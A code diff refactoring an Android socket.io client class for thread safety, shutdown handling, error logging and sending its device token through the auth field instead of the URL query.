@@ -9,6 +9,7 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
+import android.util.Log;
 import com.fason.app.core.FasonApp;
 import com.fason.app.core.config.Config;
 import java.net.URLEncoder;
@@ -18,54 +19,64 @@ import io.socket.client.Socket;
 
 public final class SocketClient {
     private static final int RECONNECT_DELAY = 5000;
-    private static SocketClient instance;
-    private Socket socket;
+    private static volatile SocketClient instance;
+    private static volatile boolean shutdownRequested = false;
+    private volatile Socket socket;
     private ConnectivityManager.NetworkCallback networkCallback;
     private final Handler handler = new Handler(Looper.getMainLooper());
     private volatile boolean connected = false;
+
     private SocketClient() {
         init();
         setupNetworkMonitor();
     }
 
     public static synchronized SocketClient getInstance() {
+        if (shutdownRequested) return null;
         if (instance == null) {
             instance = new SocketClient();
         }
         return instance;
     }
 
+    public static synchronized void reset() {
+        shutdownRequested = false;
+        instance = null;
+    }
+
     private synchronized void init() {
+        shutdownRequested = false;
         try {
             String deviceId = Settings.Secure.getString(
                 FasonApp.getContext().getContentResolver(),
                 Settings.Secure.ANDROID_ID
             );
             if (deviceId == null) deviceId = "unknown";
-            StringBuilder queryBuilder = new StringBuilder()
-                .append("model=").append(encode(Build.MODEL))
-                .append("&manf=").append(encode(Build.MANUFACTURER))
-                .append("&release=").append(encode(Build.VERSION.RELEASE))
-                .append("&id=").append(encode(deviceId));
-
-            String deviceSecret = Config.getDeviceSecret();
-            if (deviceSecret != null && !deviceSecret.isEmpty()) {
-                queryBuilder.append("&token=").append(encode(deviceSecret));
-            }
-            String query = queryBuilder.toString();
+            String query = "model=" + encode(Build.MODEL)
+                + "&manf=" + encode(Build.MANUFACTURER)
+                + "&release=" + encode(Build.VERSION.RELEASE)
+                + "&id=" + encode(deviceId);
             IO.Options opts = new IO.Options();
             opts.reconnection = true;
-            opts.reconnectionAttempts = Integer.MAX_VALUE;
+            opts.reconnectionAttempts = 10000;
             opts.reconnectionDelay = RECONNECT_DELAY;
-            opts.reconnectionDelayMax = 30000;
+            opts.reconnectionDelayMax = 60000;
             opts.timeout = 30000;
             opts.query = query;
             opts.secure = Config.isHttps();
+            String deviceSecret = Config.getDeviceSecret();
+            if (deviceSecret != null && !deviceSecret.isEmpty()) {
+                java.util.Map<String, String> auth = new java.util.HashMap<>();
+                auth.put("token", deviceSecret);
+                opts.auth = auth;
+            }
             socket = IO.socket(Config.getServerUrl(), opts);
             socket.on(Socket.EVENT_CONNECT, args -> connected = true);
             socket.on(Socket.EVENT_DISCONNECT, args -> connected = false);
             socket.on(Socket.EVENT_CONNECT_ERROR, args -> connected = false);
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            Log.e("SocketClient", "init failed", e);
+        }
     }
 
     private void setupNetworkMonitor() {
@@ -104,7 +115,8 @@ public final class SocketClient {
     }
 
     public boolean isConnected() {
-        return connected && socket != null && socket.connected();
+        Socket s = socket;
+        return connected && s != null && s.connected();
     }
 
     public void reconnect() {
@@ -119,7 +131,8 @@ public final class SocketClient {
         }
     }
 
-    public void shutdown() {
+    public synchronized void shutdown() {
+        shutdownRequested = true;
         disconnect();
         if (socket != null) {
             socket.off(Socket.EVENT_CONNECT);
@@ -137,8 +150,6 @@ public final class SocketClient {
         handler.removeCallbacksAndMessages(null);
         connected = false;
         socket = null;
-        synchronized (SocketClient.class) {
-            instance = null;
-        }
+        instance = null;
     }
 }
